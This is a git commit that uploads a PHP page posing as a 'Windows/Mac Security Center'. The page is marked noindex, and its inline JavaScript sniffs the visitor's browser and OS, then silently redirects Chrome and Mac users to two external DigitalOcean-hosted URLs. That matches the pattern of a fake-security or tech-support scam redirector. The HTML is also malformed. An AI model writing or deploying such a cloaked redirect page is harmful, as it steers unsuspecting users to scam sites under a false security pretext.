9f9bc114c1119333ce99490060cde1722666f0a1
priyushsaxena <priyushsaxena098@gmail.com>
2024-07-30 00:49:17 +0530

    Add files via upload

---
+++ index (1).php
@@ -0,0 +1,28 @@
+
+<xmlns="http:/www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Windows/Mac Security Center</title>
+    <html xmlns="http:/www.w3.org/1999/xhtml">
+      <head>
+
+        <script type="text/javascript">
+        var isChromium = window.chrome,
+          vendorName = window.navigator.vendor,
+          isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
+          isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+        isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;
+
+        if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
+          // is Google chrome
+        window.location.href = "https://sea-lion-app-58mtz.ondigitalocean.app/";
+        }
+        if(window.navigator.userAgent.indexOf("Mac") != -1 )
+          {
+               window.location.href = "https://orca-app-hpusl.ondigitalocean.app/";
+          }
+        $SAFARI_URL = "apple";
+        </script>
+    </body>
+    </html>
